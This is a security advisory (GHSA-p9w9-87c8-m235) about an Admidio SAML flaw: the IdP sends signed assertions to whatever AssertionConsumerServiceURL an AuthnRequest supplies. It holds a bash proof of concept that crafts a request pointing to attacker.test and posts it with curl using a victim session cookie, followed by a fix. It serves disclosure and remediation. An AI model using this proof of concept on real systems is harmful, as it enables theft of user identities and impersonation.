# [H] Admidio Sends SAML Response to Unvalidated Assertion Consumer Service URL from AuthnRequest

## Summary
Severity: High
Advisory: GHSA-p9w9-87c8-m235
CVE: CVE-2026-41670
CWE: CWE-20, CWE-601
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-p9w9-87c8-m235
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.9

## Details
## Summary

The SAML IdP implementation in Admidio's SSO module uses the `AssertionConsumerServiceURL` value directly from incoming SAML AuthnRequest messages as the destination for the SAML response, without validating it against the registered ACS URL (`smc_acs_url`) stored in the database for the corresponding service provider client. An attacker who knows the Entity ID of a registered SP client can craft a SAML AuthnRequest with an arbitrary `AssertionConsumerServiceURL`, causing the IdP to send the signed SAML response -- containing user identity attributes (login name, email, roles, profile fields) -- to an attacker-controlled URL.

## Details

The vulnerability is in `src/SSO/Service/SAMLService.php`, in `handleSSORequest()` at lines 439-465:

```php
// Line 439: ACS URL extracted directly from the AuthnRequest (attacker-controlled)
$clientACS = $request->getAssertionConsumerServiceURL();

// ...

// Line 456: Used as the Destination of the SAML Response
$response->setDestination($clientACS);

// Lines 463-465: Also used as the Recipient in SubjectConfirmationData
$subjectConfirmationData = new \LightSaml\Model\Assertion\SubjectConfirmationData();
$subjectConfirmationData
    ->setRecipient($clientACS) // Required recipient URL
```

There is no code that compares `$clientACS` against the client's registered `smc_acs_url` column value. The SAML 2.0 specification and OASIS security considerations explicitly require IdPs to verify that the AssertionConsumerServiceURL matches one of the SP's registered ACS endpoints.

**Signature validation is conditional and does not prevent this attack:**

At lines 417-419:
```php
if ($client->getValue('smc_require_auth_signed') || $client->getValue('smc_validate_signatures')) {
    $this->validateSignature($client, $request, $client->getValue('smc_require_auth_signed'));
}
```

If neither `smc_require_auth_signed` nor `smc_validate_signatures` is enabled for the SP client (which is the default when creating a new client), the AuthnRequest is processed without any signature verification. This means an attacker only needs to know the SP's Entity ID (which is often publicly discoverable from the SP's metadata endpoint) to craft a malicious AuthnRequest.

Even when signatures ARE validated, the ACS URL should still be checked against the registered value, because:
- Signature validation proves the request came from the SP, not that the ACS URL is authorized
- If the SP's signing key is compromised, the ACS URL becomes the last line of defense
- This follows the defense-in-depth principle mandated by SAML 2.0 Profiles Section 4.1.4.1

**The same pattern exists in the error response path** at lines 323-326:
```php
} elseif (method_exists($request, 'getAssertionConsumerServiceURL')) {
    $response->setDestination($request->getAssertionConsumerServiceURL());
} else {
    $response->setDestination($client->getValue('smc_acs_url'));
}
```

**Attack flow:**
1. Attacker discovers the Entity ID of a SAML client registered in Admidio (e.g., from the SP's public metadata)
2. Attacker crafts a SAML AuthnRequest with the legitimate Entity ID but an attacker-controlled `AssertionConsumerServiceURL`
3. Attacker sends this AuthnRequest to Admidio's SSO endpoint (via redirect or auto-submitting form)
4. If the user is already logged in to Admidio, the IdP generates a signed SAML response with the user's identity and attributes
5. The SAML response is POST-binding-sent to the attacker's URL via an auto-submitting HTML form rendered in the victim's browser
6. The attacker receives the signed SAML assertion containing login name, email, full name, roles, and other profile fields
7. The attacker can replay this SAML assertion to the legitimate SP (since it is validly signed by the IdP)

## PoC

```bash
# Step 1: Generate a malicious SAML AuthnRequest
# This is a base64-encoded SAML AuthnRequest with:
#   - Issuer = the known Entity ID of a registered SP
#   - AssertionConsumerServiceURL = attacker's server

# Example AuthnRequest XML (before base64 encoding):
# <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
#   xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
#   ID="_test123"
#   Version="2.0"
#   IssueInstant="2026-03-17T00:00:00Z"
#   AssertionConsumerServiceURL="https://attacker.test/steal-saml"
#   ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST">
#   <saml:Issuer>https://legitimate-sp.test/metadata</saml:Issuer>
# </samlp:AuthnRequest>

SAML_REQUEST=$(echo -n '<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_test123" Version="2.0" IssueInstant="2026-03-17T00:00:00Z" AssertionConsumerServiceURL="https://attacker.test/steal-saml" ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"><saml:Issuer>REGISTERED_SP_ENTITY_ID</saml:Issuer></samlp:AuthnRequest>' | base64 -w 0)

# Step 2: Send via HTTP-POST binding to Admidio's SSO endpoint
# (This would typically be done by tricking a logged-in user to visit a page with an auto-submitting form)
curl -X POST "https://TARGET/modules/sso/index.php/saml/sso" \
  -d "SAMLRequest=$SAML_REQUEST" \
  -b "ADMIDIO_SESSION=victim_session_cookie"

# Step 3: If the victim is logged in, Admidio will render an auto-submitting HTML form
# that POSTs the signed SAML Response to https://attacker.test/steal-saml
# The response contains: user login name, email, full name, roles, and any other
# profile fields configured in the SP's field mapping

# Step 4: Attacker receives the signed SAML assertion and can replay it
# to the legitimate SP to authenticate as the victim
```

## Impact

- **User Identity Theft**: The signed SAML assertion containing login credentials, email, name, and roles is sent to an attacker-controlled URL. The attacker can replay this assertion to the legitimate SP to impersonate the victim.
- **Information Disclosure**: User profile data (email, phone, address, role memberships, and any custom profile fields configured in the SP's field mapping) is exfiltrated.
- **Scope Change (S:C)**: The IdP vulnerability directly enables impersonation on separate Service Provider applications.
- **No Signature Required**: When `smc_require_auth_signed` is not enabled (default), the attack requires zero knowledge of cryptographic keys -- only the SP's Entity ID.

## Recommended Fix

Validate the `AssertionConsumerServiceURL` from the AuthnRequest against the registered `smc_acs_url` before using it. In `src/SSO/Service/SAMLService.php`, add validation after loading the client:

```php
// After line 439: $clientACS = $request->getAssertionConsumerServiceURL();

// Validate ACS URL against registered client configuration
$registeredACS = $client->getValue('smc_acs_url');
if (!empty($clientACS) && $clientACS !== $registeredACS) {
    throw new Exception(
        'The AssertionConsumerServiceURL in the AuthnRequest ("' . $clientACS . '") ' .
        'does not match the registered ACS URL for this client. ' .
        'Possible assertion theft attempt.'
    );
}

// If no ACS URL in request, fall back to the registered one
if (empty($clientACS)) {
    $clientACS = $registeredACS;
}
```

Also apply the same validation in the `errorResponse()` method at line 323-326:

```php
// Replace lines 323-326 with:
if ($request instanceof LogoutRequest) {
    $response->setDestination($client->getValue('smc_slo_url'));
} else {
    // Always use the registered ACS URL, never the request's ACS URL
    $response->setDestination($client->getValue('smc_acs_url'));
}
```

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-p9w9-87c8-m235
- https://nvd.nist.gov/vuln/detail/CVE-2026-41670
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.9
